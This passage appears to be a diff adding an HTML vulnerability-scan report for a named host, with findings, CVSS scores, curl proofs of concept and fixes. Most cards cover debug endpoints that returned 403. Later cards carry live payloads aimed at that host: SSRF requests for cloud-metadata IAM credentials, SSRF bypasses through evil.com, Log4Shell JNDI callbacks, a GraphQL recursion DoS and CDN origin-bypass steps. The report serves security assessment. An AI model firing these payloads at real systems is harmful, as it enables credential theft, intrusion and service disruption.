+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/metrics returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/metrics</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_METRICS_PROMETHEUS</b> — Debug/profiler endpoint accessible: /metrics/prometheus
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/metrics/prometheus returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/metrics/prometheus</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_JOLOKIA</b> — Debug/profiler endpoint accessible: /jolokia
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/jolokia returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/jolokia</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_JOLOKIA_READ</b> — Debug/profiler endpoint accessible: /jolokia/read
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/jolokia/read returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/jolokia/read</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-__AH_ADMIN</b> — Debug/profiler endpoint accessible: /_ah/admin
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/_ah/admin returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/_ah/admin</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-__AH_MAIL</b> — Debug/profiler endpoint accessible: /_ah/mail
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/_ah/mail returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/_ah/mail</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-__AH_WARMUP</b> — Debug/profiler endpoint accessible: /_ah/warmup
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/_ah/warmup returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/_ah/warmup</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_DRUID_INDEX.HTML</b> — Debug/profiler endpoint accessible: /druid/index.html
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/druid/index.html returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/druid/index.html</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_KIBANA</b> — Debug/profiler endpoint accessible: /kibana
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/kibana returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/kibana</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_SOLR_ADMIN</b> — Debug/profiler endpoint accessible: /solr/admin
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/solr/admin returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/solr/admin</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_SOLR_ADMIN_INFO_SYS</b> — Debug/profiler endpoint accessible: /solr/admin/info/system
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/solr/admin/info/system returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/solr/admin/info/system</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-___ADMIN__</b> — Debug/profiler endpoint accessible: /__admin__
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/__admin__ returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/__admin__</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-___STATUS__</b> — Debug/profiler endpoint accessible: /__status__
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/__status__ returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/__status__</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-___HEALTH__</b> — Debug/profiler endpoint accessible: /__health__
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/__health__ returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/__health__</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_TELESCOPE</b> — Debug/profiler endpoint accessible: /telescope
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/telescope returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/telescope</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_TELESCOPE_REQUESTS</b> — Debug/profiler endpoint accessible: /telescope/requests
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/telescope/requests returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/telescope/requests</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_HORIZON</b> — Debug/profiler endpoint accessible: /horizon
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/horizon returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/horizon</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_HORIZON_API_STATS</b> — Debug/profiler endpoint accessible: /horizon/api/stats
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/horizon/api/stats returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/horizon/api/stats</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-__PROFILER_PHPSTORM</b> — Debug/profiler endpoint accessible: /_profiler/phpstorm
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/_profiler/phpstorm returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/_profiler/phpstorm</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DEBUG-EP-_?XDEBUG_SESSION_STA</b> — Debug/profiler endpoint accessible: /?XDEBUG_SESSION_START=1
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-489 &nbsp;|&nbsp; CVSS: 4.3 &nbsp;|&nbsp; Information Disclosure</div>
+    <p>https://ehub.ejada.com/?XDEBUG_SESSION_START=1 returned 403. Content: Host not in allowlist</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/?XDEBUG_SESSION_START=1</code></pre>
+    <div class="fix">Fix: Disable debug endpoints in production. Restrict with network ACL or remove entirely.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>GQL-CIRCULAR-CIRCULAR</b> — GraphQL circular payload accepted (0.0s) — DoS surface
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-674 &nbsp;|&nbsp; CVSS: 5.9 &nbsp;|&nbsp; GraphQL</div>
+    <p>GraphQL endpoint /graphql processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk -X POST https://ehub.ejada.com/graphql -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;query&quot;: &quot;fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }&quot;}...&#x27;</code></pre>
+    <div class="fix">Fix: Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>GQL-CIRCULAR-CIRCULAR</b> — GraphQL circular payload accepted (0.0s) — DoS surface
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-674 &nbsp;|&nbsp; CVSS: 5.9 &nbsp;|&nbsp; GraphQL</div>
+    <p>GraphQL endpoint /api/graphql processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk -X POST https://ehub.ejada.com/api/graphql -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;query&quot;: &quot;fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }&quot;}...&#x27;</code></pre>
+    <div class="fix">Fix: Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>GQL-CIRCULAR-CIRCULAR</b> — GraphQL circular payload accepted (0.0s) — DoS surface
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-674 &nbsp;|&nbsp; CVSS: 5.9 &nbsp;|&nbsp; GraphQL</div>
+    <p>GraphQL endpoint /gql processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk -X POST https://ehub.ejada.com/gql -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;query&quot;: &quot;fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }&quot;}...&#x27;</code></pre>
+    <div class="fix">Fix: Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>GQL-CIRCULAR-CIRCULAR</b> — GraphQL circular payload accepted (0.0s) — DoS surface
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-674 &nbsp;|&nbsp; CVSS: 5.9 &nbsp;|&nbsp; GraphQL</div>
+    <p>GraphQL endpoint /query processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk -X POST https://ehub.ejada.com/query -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;query&quot;: &quot;fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }&quot;}...&#x27;</code></pre>
+    <div class="fix">Fix: Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>DNS-REBIND-SURFACE</b> — DNS rebinding attack surface assessment for ehub.ejada.com
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-346 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; DNS</div>
+    <p>Host ehub.ejada.com resolves to 34.111.193.103 (public).
+CORS Origin: null → ACAO: &#x27;&#x27;
+DNS rebinding: attacker DNS record oscillates between attacker IP and target IP. Browser then allows cross-origin requests to the re-bound address. Services trusting Host header or lacking CSRF protection are vulnerable.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code># DNS rebinding PoC (use singularity or rebind.network):
+# 1. Register attacker domain with short TTL → your IP
+# 2. Victim browser loads attacker page
+# 3. DNS flips to 34.111.193.103
+# 4. XHR to http://attacker-domain/ now hits ehub.ejada.com
+curl -sk https://ehub.ejada.com/ -H &#x27;Host: attacker-rebind.example.com&#x27;</code></pre>
+    <div class="fix">Fix: Validate Host header against a strict allowlist. Set DNS TTL ≥ 300s. Bind services to specific IPs, not 0.0.0.0. Require CSRF tokens.</div>
+  </div>
+</div>
+<div class="card" data-sev="MEDIUM">
+  <div class="card-hdr" style="border-left:4px solid #ffc107">
+    <span class="badge" style="background:#ffc107">MEDIUM</span>
+    <b>CF-ORIGIN-BYPASS-001</b> — Cloudflare/CDN Origin Bypass Attack Surface
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-441 &nbsp;|&nbsp; CVSS: 5.3 &nbsp;|&nbsp; CDN Bypass</div>
+    <p>Multiple indicators for Cloudflare/CDN origin IP bypass at ehub.ejada.com. Direct-to-origin connection bypasses WAF rules, rate limiting, and DDoS protection.</p>
+    <b>Evidence:</b><pre><code>Current resolved IP: 34.111.193.103 — test direct connection bypassing WAF/CDN
+Subdomains discovered: www.ejada.com, mail.ejada.com, smtp.ejada.com — test each for direct-to-origin access bypassing CDN</code></pre>
+    <b>PoC (curl):</b><pre><code># Test direct connection with Host header:
+curl -sk --resolve &#x27;ehub.ejada.com:34.111.193.103&#x27; &#x27;https://ehub.ejada.com/&#x27; -H &#x27;Host: ehub.ejada.com&#x27;
+# Check cdn-cgi/trace for origin info:
+curl -sk &#x27;https://ehub.ejada.com/cdn-cgi/trace&#x27;</code></pre>
+    <div class="fix">Fix: Configure Cloudflare to block non-Cloudflare IPs (Cloudflare IP ranges only). Enable authenticated origin pulls. Use Argo Tunnel / Cloudflare Access.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>F-BSSRF-001</b> — Blind SSRF Attack Surface — OOB Payloads Generated
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>Generated 10 OOB SSRF payloads for manual verification.</p>
+    <b>Evidence:</b><pre><code>proxy: https://ehub.ejada.com?proxy=http%3A//proxy.ehub.ejada.com.YOUR_OOB_DOMAIN.burpc
+endpoint: https://ehub.ejada.com?endpoint=http%3A//endpoint.ehub.ejada.com.YOUR_OOB_DOMAIN
+target: https://ehub.ejada.com?target=http%3A//target.ehub.ejada.com.YOUR_OOB_DOMAIN.bur
+href: https://ehub.ejada.com?href=http%3A//href.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcol
+fetch: https://ehub.ejada.com?fetch=http%3A//fetch.ehub.ejada.com.YOUR_OOB_DOMAIN.burpc
+feed: https://ehub.ejada.com?feed=http%3A//feed.ehub.ejad</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com?proxy=http%3A//proxy.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/&#x27;</code></pre>
+    <div class="fix">Fix: Use Burp Collaborator or https://app.interactsh.com to detect DNS callbacks.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>F-VDP-001</b> — No security.txt / Vulnerability Disclosure Policy
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-200 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; VDP</div>
+    <p>No security.txt file found. Researchers have no official contact for vulnerability reports.</p>
+    <b>Evidence:</b><pre><code>Checked: [&#x27;/.well-known/security.txt&#x27;, &#x27;/security.txt&#x27;, &#x27;/.well-known/change-password&#x27;, &#x27;/bugbounty&#x27;, &#x27;/responsible-disclosure&#x27;, &#x27;/vulnerability-disclosure&#x27;]</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/.well-known/security.txt&#x27;</code></pre>
+    <div class="fix">Fix: Create /.well-known/security.txt per RFC 9116 with Contact: and Policy: fields.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSRF-META-PROBE</b> — Cloud metadata SSRF payloads generated (manual verification required)
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>SSRF parameters probed for cloud metadata leakage. No confirmed hit in automated scan — manual verification needed with burp collaborator.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/&#x27;
+curl -sk &#x27;https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&#x27;
+curl -sk &#x27;https://ehub.ejada.com/?url=http://metadata.google.internal/computeMetadata/v1/&#x27;
+curl -sk &#x27;https://ehub.ejada.com/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&#x27;
+curl -sk &#x27;https://ehub.ejada.com/?url=http://100.100.100.200/latest/meta-data/&#x27;
+curl -sk &#x27;https://ehub.ejada.com/?url=http://fd00:ec2::254/latest/meta-data/&#x27;</code></pre>
+    <div class="fix">Fix: Implement SSRF allowlist. Block RFC1918 + 169.254.0.0/16 ranges in outbound requests.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSL-PIN-HINTS</b> — SSL certificate fingerprints (for pinning bypass research)
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-295 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; TLS</div>
+    <p>CN=? | Issuer=? | Expires=?
+SHA-256: 579f1b9818e49c34198b6a01421651818b8e1af455cffb313ad77280b961bb7a
+SHA-1: e5dc13f4e8bbd319fd0e68c9bb66acd061ca5833</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code># Add to Frida/objection pinning bypass:
+# openssl s_client -connect ehub.ejada.com:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -fingerprint -sha256</code></pre>
+    <div class="fix">Fix: Implement certificate pinning with backup pins. Rotate pins with 60-day lead time.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>LOG4SHELL-OOB-POC</b> — Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-917 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; RCE</div>
+    <p>JNDI payloads were sent in 5 common headers. No server-side reflection detected passively. Use Burp Collaborator to observe DNS/HTTP callbacks.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk https://ehub.ejada.com/ -H &#x27;User-Agent: ${jndi:ldap://COLLAB/0}&#x27;
+curl -sk https://ehub.ejada.com/ -H &#x27;X-Forwarded-For: ${jndi:ldap://COLLAB/1}&#x27;
+curl -sk https://ehub.ejada.com/ -H &#x27;X-Api-Version: ${jndi:ldap://COLLAB/2}&#x27;
+curl -sk https://ehub.ejada.com/ -H &#x27;X-Remote-IP: ${jndi:ldap://COLLAB/3}&#x27;
+curl -sk https://ehub.ejada.com/ -H &#x27;X-Remote-Addr: ${jndi:ldap://COLLAB/4}&#x27;</code></pre>
+    <div class="fix">Fix: Upgrade Log4j to ≥2.17.1. Remove log4j from all JVM-based services. Block outbound LDAP/RMI.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SSRF-BYPASS-POC</b> — SSRF URL parser bypass payloads generated — manual verification required
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; SSRF</div>
+    <p>11 SSRF blocklist bypass variants generated for manual testing with Burp Collaborator.</p>
+    <b>Evidence:</b><pre><code></code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sk &#x27;https://ehub.ejada.com//?url=http://evil.com@169.254.169.254/latest/meta-data/&#x27;
+curl -sk &#x27;https://ehub.ejada.com//?url=http://169.254.169.254#@evil.com/&#x27;
+curl -sk &#x27;https://ehub.ejada.com//?url=http://169.254.169.254%252F%252F&#x27;
+curl -sk &#x27;https://ehub.ejada.com//?url=http://0x7f000001/&#x27;
+curl -sk &#x27;https://ehub.ejada.com//?url=http://2130706433/&#x27;</code></pre>
+    <div class="fix">Fix: Allowlist by resolved IP, not URL string. Parse URL server-side with a strict library before any fetch.</div>
+  </div>
+</div>
+<div class="card" data-sev="INFO">
+  <div class="card-hdr" style="border-left:4px solid #6c757d">
+    <span class="badge" style="background:#6c757d">INFO</span>
+    <b>SQLI-OOB-DNS</b> — OOB SQL injection DNS payloads generated (MySQL/MSSQL/Oracle/PostgreSQL)
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-89 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Injection</div>
+    <p>DNS-based out-of-band SQLi payloads generated for all four major databases. Replace YOUR_COLLABORATOR with Burp Collaborator or interactsh host. DNS callbacks confirm blind SQLi when error/boolean methods are blocked.</p>
